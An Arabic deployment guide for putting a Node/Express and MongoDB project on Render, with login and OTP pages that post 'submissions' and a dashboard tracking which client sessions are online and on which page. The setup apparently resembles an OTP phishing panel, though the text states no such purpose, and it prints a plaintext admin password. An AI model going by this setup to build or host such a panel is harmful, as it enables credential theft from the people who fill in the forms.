# دليل رفع المشروع على Render 🚀

## 1. هيكل المشروع الحالي
```
Yasmeen/                 # Frontend + Dashboard + Server
├── server/             # API + Static files server (Express + Mongo)
├── dashboard-separate/ # Admin Dashboard (ملفات منفصلة)
├── login.html         # Frontend pages
├── otp.html, etc.
├── api-client.js      # Shared (frontend + dashboard)
├── form-handler.js
├── api-config.js
└── TODO.md
```

**الهدف: واحد Render service يخدم:**
- **Frontend**: /login.html, /otp.html → POST submissions + heartbeat
- **Dashboard**: /dashboard-separate/index.html → GET submissions?online=true

## 2. إعداد GitHub Repository 📤

```
1. git init
2. git add .
3. git commit -m "Initial Yasmeen project"
4. github.com → New repo → yasmeen-project
5. git remote add origin https://github.com/YOUR_USERNAME/yasmeen-project.git
6. git branch -M main
7. git push -u origin main
```

## 3. رفع على Render (**واحد Web Service** - Frontend + Dashboard + API) 🟢

### A. إنشاء Render Service
1. **render.com** → Sign up → Connect GitHub
2. **New** → **Web Service**
3. Connect **yasmeen-project** repo (المشروع كامل)
4. **Settings:**
```
Name: servv-jjc6          # مثالك
Environment: Node
Region: Ohio (أقرب)
Branch: main
Root Directory: /
Build Command: npm install
Start Command: node server/index.js
Instance Type: Free
```

### B. Environment Variables (دومينات منفصلة) ⚙️
```
PORT=10000
MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/yasmeen
DEFAULT_APP_KEY=yasmeen
DASHBOARD_ADMIN_PASSWORD=qqwe@22
ADMIN_CONFIG_PASSWORD=your-admin-pass

## ✅ دومين الفرونت (heartbeat sender)
FRONTEND_DOMAIN_URLS=example-front-end.com,front.yourdomain.com

## ✅ دومين الداشبورد (status viewer)
DASHBOARD_DOMAIN_URLS=example-dashboard.com,dashboard.yourdomain.com

## CORS (كلا الدومين)
PUBLIC_SITE_URL=example-front-end.com,example-dashboard.com
```

### C. إضافة Custom Domains 🔗
```
1. Render → servv-jjc6 → Custom Domains → Add Custom Domain
2. Frontend domain: example-front-end.com → CNAME → servv-jjc6.onrender.com
3. Dashboard domain: example-dashboard.com → CNAME → servv-jjc6.onrender.com
4. Update Env Vars → Manual Deploy
```

5. **Deploy** → Live في 2 دقائق!



5. **Deploy** → Live في 2-5 دقائق!

## 4. الوصول للتطبيق 🌐
```
Frontend: https://yasmeen-app.onrender.com/login.html
Dashboard: https://yasmeen-app.onrender.com/dashboard-separate/index.html

API: https://yasmeen-app.onrender.com/api/submissions
Heartbeat: POST /api/heartbeat
```

## 5. كيف يعمل التوصيل تلقائياً 🔗

```
Frontend page (/login.html) →
  api-config.js → window.API_BASE_URL = Render auto-detect
  api-client.js → POST /api/submissions + heartbeat /api/heartbeat
  ↓
MongoDB ← Server stores {client_session_id, page, last_heartbeat}
  ↓
Dashboard /dashboard-separate/ → GET /api/submissions?online=true
  → Shows 🟢 متصل (heartbeat <5min) / 🔴 غير متصل + last_page
```

**Server serves static files from project root + dashboard-separate/**

## 6. Custom Domains (اختياري) 🛡️

```
1. Render Dashboard → yasmeen-app → Custom Domains
2. Add: frontend.yourdomain.com → /login.html
3. Add: dashboard.yourdomain.com → /dashboard-separate/
4. Update PUBLIC_SITE_URL=frontend.yourdomain.com,dashboard.yourdomain.com
```

## 7. اختبار الدومينات ✅

```
curl https://yasmeen-app.onrender.com/api/health → {ok:true}
curl -X POST https://yasmeen-app.onrender.com/api/heartbeat -d '{"client_session_id":"test"}'
→ {ok:true, updated:true}

Frontend: Open login.html → F12 Console → heartbeat logging
Dashboard: login qqwe@22 → see online status change
```

## 8. Auto-Deploy من GitHub 🔄
```
GitHub → edit any file → commit → Render auto-deploys in ~1min
```

## مشاكل شائعة؟ 🆘
| مشكلة | حل |
|--------|-----|
| CORS error | تحقق PUBLIC_SITE_URL (exact domain, comma separated) |
| API_BASE_URL wrong | تأكد /env-api-override.js loads |
| Mongo timeout | MONGODB_URI connection string valid |
| Static 404 | Build command `npm i`, Start `node server/index.js` |

**جاهز! 🚀 Live URLs:**
```
Frontend: https://yasmeen-app.onrender.com/login.html  
Dashboard: https://yasmeen-app.onrender.com/dashboard-separate/
```

